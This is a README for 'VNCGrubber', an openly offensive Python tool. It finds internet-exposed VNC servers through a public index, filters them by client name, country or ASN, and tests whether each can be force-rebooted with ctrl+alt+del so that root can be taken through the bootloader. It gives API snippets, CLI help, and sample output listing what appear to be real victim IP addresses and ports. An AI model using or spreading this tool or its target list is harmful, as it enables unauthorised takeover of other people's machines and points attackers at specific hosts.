# VNCGrubber
A script that takes ip addresses from [VNC Resolver](https://computernewb.com/vncresolver) and checks them for vulnerabilities by rebooting the machine via ctrl+alt+del, which further facilitates obtaining root access through the operating system bootloader

# Search

## Search with filter
```python
from typing import List
from VNCGrubber.search import VNC, search_filter

hosts: List[VNC] = await search_filter(clientname='ubuntu')
for vnc in hosts:
    print(vnc.ip, vnc,port)
```

## Search random
```python
from VNCGrubber.search import VNC, search_random

vnc: VNC = await search_random()
print(vnc.ip, vnc.port)
```

# ctrl+alt+del check
```python
from VNCGrubber.search import VNC, search_random
from VNCGrubber.vnc import check_crt_alt_del

vnc: VNC = await search_random()
print(await check_crt_alt_del(vnc.ip, vnc.port))
```

# CLI
```
$ python -m VNCGrubber --help

usage: VNCGrubber [-h] [--clientname CLIENTNAME] [--country COUNTRY] [--asn ASN] [--count COUNT] [--check_crt_alt_del [CHECK_CRT_ALT_DEL]] [--show_failed] [--screen_delay SCREEN_DELAY]

optional arguments:
  -h, --help            show this help message and exit
  --clientname CLIENTNAME
                        Filter by client name, note that it is case-sensitive!
  --country COUNTRY     Filter by ISO 3166-1 alpha-2 country code
  --asn ASN             Filter by ASN
  --count COUNT         Number of VNCs to find
  --check_crt_alt_del [CHECK_CRT_ALT_DEL]
                        If you specify this parameter without a value, only those VNCs from the search that pass the ctrl_alt_del check will be returned. If a value is passed, it must be a VNC
                        address that will be checked against ctrl_alt_del.
  --show_failed         Return VNCs that failed the ctrl_alt_del check
  --screen_delay SCREEN_DELAY
                        Delay between taking two screenshots in milliseconds

If you specify one of the filtering parameters, a search by fitration will be launched, otherwise a search for random VNCs will be launched. If you specify the --count option, the required VNC
number will be found. The number of found VNCs may be less than the --count parameter when searching with filtering.
```

## Random search
```
$ python -m VNCGrubber
123.143.19.126:5900
```

## Search with filter
```
$ python -m VNCGrubber --clientname ubuntu --count 10
65.109.48.105:5900
83.0.125.210:5900
5.9.62.60:5900
51.79.230.157:5900
101.6.30.195:5901
42.51.28.181:5900
47.98.47.8:5901
119.139.194.156:5901
123.116.96.2:5900
218.64.119.81:5901
```

## Check crt+alt+del
### Search with check
```
$ python -m VNCGrubber --clientname ubuntu --count 10 --check_crt_alt_del
65.109.48.105:5900
83.0.125.210:5900
5.9.62.60:5900
101.6.30.195:5901
42.51.28.181:5900
119.139.194.156:5901
123.116.96.2:5900
```

### Check a specific host
```
$ python -m VNCGrubber --check_crt_alt_del 119.139.194.156:5901
True
```
